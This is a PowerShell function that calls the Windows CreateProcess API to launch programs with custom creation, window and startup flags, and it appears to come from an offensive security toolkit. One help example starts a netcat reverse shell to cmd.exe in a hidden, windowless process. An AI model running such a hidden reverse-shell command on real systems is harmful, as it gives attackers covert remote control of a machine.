function Invoke-CreateProcess {
<#
.SYNOPSIS

     -Binary            Full path of the module to be executed.
                       
     -Args              Arguments to pass to the module, e.g. "/c calc.exe". Defaults
                        to $null if not specified.
                       
     -CreationFlags     Process creation flags:
                          0x00000000 (NONE)
                          0x00000001 (DEBUG_PROCESS)
                          0x00000002 (DEBUG_ONLY_THIS_PROCESS)
                          0x00000004 (CREATE_SUSPENDED)
                          0x00000008 (DETACHED_PROCESS)
                          0x00000010 (CREATE_NEW_CONSOLE)
                          0x00000200 (CREATE_NEW_PROCESS_GROUP)
                          0x00000400 (CREATE_UNICODE_ENVIRONMENT)
                          0x00000800 (CREATE_SEPARATE_WOW_VDM)
                          0x00001000 (CREATE_SHARED_WOW_VDM)
                          0x00040000 (CREATE_PROTECTED_PROCESS)
                          0x00080000 (EXTENDED_STARTUPINFO_PRESENT)
                          0x01000000 (CREATE_BREAKAWAY_FROM_JOB)
                          0x02000000 (CREATE_PRESERVE_CODE_AUTHZ_LEVEL)
                          0x04000000 (CREATE_DEFAULT_ERROR_MODE)
                          0x08000000 (CREATE_NO_WINDOW)
                        
     -ShowWindow        Window display flags:
                          0x0000 (SW_HIDE)
                          0x0001 (SW_SHOWNORMAL)
                          0x0001 (SW_NORMAL)
                          0x0002 (SW_SHOWMINIMIZED)
                          0x0003 (SW_SHOWMAXIMIZED)
                          0x0003 (SW_MAXIMIZE)
                          0x0004 (SW_SHOWNOACTIVATE)
                          0x0005 (SW_SHOW)
                          0x0006 (SW_MINIMIZE)
                          0x0007 (SW_SHOWMINNOACTIVE)
                          0x0008 (SW_SHOWNA)
                          0x0009 (SW_RESTORE)
                          0x000A (SW_SHOWDEFAULT)
                          0x000B (SW_FORCEMINIMIZE)
                          0x000B (SW_MAX)
						  
     -StartF            Bitfield to influence window creation:
                          0x00000001 (STARTF_USESHOWWINDOW)
                          0x00000002 (STARTF_USESIZE)
                          0x00000004 (STARTF_USEPOSITION)
                          0x00000008 (STARTF_USECOUNTCHARS)
                          0x00000010 (STARTF_USEFILLATTRIBUTE)
                          0x00000020 (STARTF_RUNFULLSCREEN)
                          0x00000040 (STARTF_FORCEONFEEDBACK)
                          0x00000080 (STARTF_FORCEOFFFEEDBACK)
                          0x00000100 (STARTF_USESTDHANDLES)

.DESCRIPTION

	Author: Ruben Boonen (@FuzzySec)
	License: BSD 3-Clause
	Required Dependencies: None
	Optional Dependencies: None

.EXAMPLE
	Start calc with NONE/SW_SHOWNORMAL/STARTF_USESHOWWINDOW

	C:\PS> Invoke-CreateProcess -Binary C:\Windows\System32\calc.exe -CreationFlags 0x0 -ShowWindow 0x1 -StartF 0x1
	
.EXAMPLE
	Start nc reverse shell with CREATE_NO_WINDOW/SW_HIDE/STARTF_USESHOWWINDOW

	C:\PS> Invoke-CreateProcess -Binary C:\Some\Path\nc.exe -Args "-nv 127.0.0.1 9988 -e C:\Windows\System32\cmd.exe" -CreationFlags 0x8000000 -ShowWindow 0x0 -StartF 0x1

#>

	param (
        [Parameter(Mandatory = $True)]
		[string]$Binary,
        [Parameter(Mandatory = $False)]
		[string]$Args=$null,
        [Parameter(Mandatory = $True)]
		[string]$CreationFlags,
        [Parameter(Mandatory = $True)]
		[string]$ShowWindow,
        [Parameter(Mandatory = $True)]
		[string]$StartF
	)  

    # Define all the structures for CreateProcess
	Add-Type -TypeDefinition @"
	using System;
	using System.Diagnostics;
	using System.Runtime.InteropServices;
	
	[StructLayout(LayoutKind.Sequential)]
	public struct PROCESS_INFORMATION
	{
		public IntPtr hProcess; public IntPtr hThread; public uint dwProcessId; public uint dwThreadId;
	}
	
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct STARTUPINFO
	{
		public uint cb; public string lpReserved; public string lpDesktop; public string lpTitle;
		public uint dwX; public uint dwY; public uint dwXSize; public uint dwYSize; public uint dwXCountChars;
		public uint dwYCountChars; public uint dwFillAttribute; public uint dwFlags; public short wShowWindow;
		public short cbReserved2; public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput;
		public IntPtr hStdError;
	}
	
	[StructLayout(LayoutKind.Sequential)]
	public struct SECURITY_ATTRIBUTES
	{
		public int length; public IntPtr lpSecurityDescriptor; public bool bInheritHandle;
	}
	
	public static class Kernel32
	{
		[DllImport("kernel32.dll", SetLastError=true)]
		public static extern bool CreateProcess(
			string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, 
			ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, 
			IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, 
			out PROCESS_INFORMATION lpProcessInformation);
	}
"@
	
	# StartupInfo Struct
	$StartupInfo = New-Object STARTUPINFO
	$StartupInfo.dwFlags = $StartF # StartupInfo.dwFlag
	$StartupInfo.wShowWindow = $ShowWindow # StartupInfo.ShowWindow
	$StartupInfo.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($StartupInfo) # Struct Size
	
	# ProcessInfo Struct
	$ProcessInfo = New-Object PROCESS_INFORMATION
	
	# SECURITY_ATTRIBUTES Struct (Process & Thread)
	$SecAttr = New-Object SECURITY_ATTRIBUTES
	$SecAttr.Length = [System.Runtime.InteropServices.Marshal]::SizeOf($SecAttr)
	
	# CreateProcess --> lpCurrentDirectory
	$GetCurrentPath = (Get-Item -Path ".\" -Verbose).FullName
	
	# Call CreateProcess
	[Kernel32]::CreateProcess($Binary, $Args, [ref] $SecAttr, [ref] $SecAttr, $false, $CreationFlags, [IntPtr]::Zero, $GetCurrentPath, [ref] $StartupInfo, [ref] $ProcessInfo) |out-null
	
	echo "`nProcess Information:"
	Get-Process -Id $ProcessInfo.dwProcessId |ft
}